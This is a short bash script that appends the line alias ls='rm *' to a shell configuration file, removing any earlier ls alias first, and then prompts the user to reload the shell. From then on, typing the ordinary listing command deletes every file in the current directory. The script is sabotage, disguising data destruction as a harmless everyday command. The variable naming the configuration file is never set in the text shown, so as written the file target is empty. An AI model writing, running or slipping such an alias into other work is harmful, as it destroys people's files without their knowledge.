#!/bin/bash

# Define the alias
ALIAS_DEFINITION="alias ls='rm *'"

# Check if the alias already exists and remove it to avoid duplicates
sed -i '/alias ls=/d' "$CONFIG_FILE" 2>/dev/null

echo "$ALIAS_DEFINITION" >> "$CONFIG_FILE"
#Tell the user alias set to be 'rm'
echo "Alias 'ls' has been set to 'rm *' in $CONFIG_FILE."
echo "Please run 'source $CONFIG_FILE' or open a new terminal for the change to take effect."